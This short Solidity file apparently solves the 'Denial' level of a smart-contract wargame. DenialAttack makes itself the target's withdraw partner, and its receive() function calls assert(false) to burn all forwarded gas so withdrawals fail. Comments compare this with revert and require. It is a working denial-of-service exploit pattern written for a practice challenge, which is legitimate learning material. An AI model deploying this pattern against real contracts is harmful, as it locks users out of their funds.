// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./_20_Denial.sol";

contract DenialAttack {
    function attack(address payable contractAddress) public {
        Denial denial = Denial(contractAddress);
        denial.setWithdrawPartner(address(this));
    }

    // allow deposit of funds
    receive() external payable {
        // assert consumes all gas
        assert(false);

        // Others will refund any remaining gas to the caller and will allow you to return a value.
        // revert("revert");
        // require(false, "I will return remaining gas!");
    }

    fallback() external payable {
        //receive() external payable — for empty calldata (and any value)
        //fallback() external payable — when no other function matches (not even the receive function). Optionally payable.
    }
}
